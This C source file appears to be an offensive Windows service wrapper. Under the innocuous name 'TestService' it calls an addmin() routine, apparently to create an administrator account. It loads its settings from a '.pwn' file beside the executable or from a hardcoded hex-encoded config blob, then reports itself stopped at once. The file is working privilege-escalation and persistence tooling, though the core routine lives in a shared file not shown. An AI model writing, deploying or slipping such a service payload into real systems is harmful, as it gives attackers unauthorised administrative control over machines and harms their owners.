#include <windows.h>
#include <stdio.h>

#include "../addmin-shared/addmin-shared.h"

// comment the next line to disable fallback to fixed config
#define ADDMIN_FALLBACK_CONFIG

#ifdef ADDMIN_FALLBACK_CONFIG
#include "../addmin-shared/hex.h"
#define CONFIG_DEFAULT "52455a1146bc0e620589a6ca53b3d887668c3a71320800c203dd967eaad3ff08c9827127df2fdedec247e35912289a4f93c6f012ae80632ca39dc0627d0648495902a2d565fad3da824dfc2be50b25a2abaf4c485ff565d941173e8cbd9dedaebf"
#endif

#define SERVICE_NAME L"TestService"

SERVICE_STATUS serviceStatus;
SERVICE_STATUS_HANDLE hStatus;


void serviceMain(int argc, char** argv);
void controlHandler(DWORD request);

int main() {
    SERVICE_TABLE_ENTRY ServiceTable[] = {
        {(LPWSTR)SERVICE_NAME, (LPSERVICE_MAIN_FUNCTION)serviceMain},
        {NULL, NULL}
    };

    char fallbackConfig[CONFIG_MAX_SIZE];
    #ifdef ADDMIN_FALLBACK_CONFIG
    size_t fallbackConfigLen = decodeHex(CONFIG_DEFAULT, sizeof(CONFIG_DEFAULT) - 1, fallbackConfig, sizeof(fallbackConfig));
    #endif

    TCHAR configPath[MAX_PATH];
    GetModuleFileName(NULL, configPath, MAX_PATH);
    size_t len = _tcslen(configPath);
    configPath[len - 3] = 'p';
    configPath[len - 2] = 'w';
    configPath[len - 1] = 'n';

    #ifdef ADDMIN_FALLBACK_CONFIG
    addmin(configPath, fallbackConfig, fallbackConfigLen);
    #else
    addmin(configPath, NULL, 0);
    #endif

    if (!StartServiceCtrlDispatcher(ServiceTable)) {
        return 1;
    }

    return 0;
}

void serviceMain(int argc, char** argv) {
    serviceStatus.dwServiceType = SERVICE_WIN32;
    serviceStatus.dwCurrentState = SERVICE_START_PENDING;
    serviceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    serviceStatus.dwWin32ExitCode = 0;
    serviceStatus.dwServiceSpecificExitCode = 0;
    serviceStatus.dwCheckPoint = 0;
    serviceStatus.dwWaitHint = 0;

    hStatus = RegisterServiceCtrlHandler(SERVICE_NAME, (LPHANDLER_FUNCTION)controlHandler);
    if (hStatus == (SERVICE_STATUS_HANDLE)0) {
        return;
    }

    serviceStatus.dwCurrentState = SERVICE_STOPPED;
    SetServiceStatus(hStatus, &serviceStatus);

    return;
}

void controlHandler(DWORD request) {
    //switch (request) {
    //    case SERVICE_CONTROL_STOP:
    //        serviceStatus.dwWin32ExitCode = 0;
    //        serviceStatus.dwCurrentState = SERVICE_STOPPED;
    //        SetServiceStatus(hStatus, &serviceStatus);
    //        return;

    //    case SERVICE_CONTROL_SHUTDOWN:
    //        serviceStatus.dwWin32ExitCode = 0;
    //        serviceStatus.dwCurrentState = SERVICE_STOPPED;
    //        SetServiceStatus(hStatus, &serviceStatus);
    //        return;

    //    default:
    //        break;
    //}

    SetServiceStatus(hStatus, &serviceStatus);
    return;
}
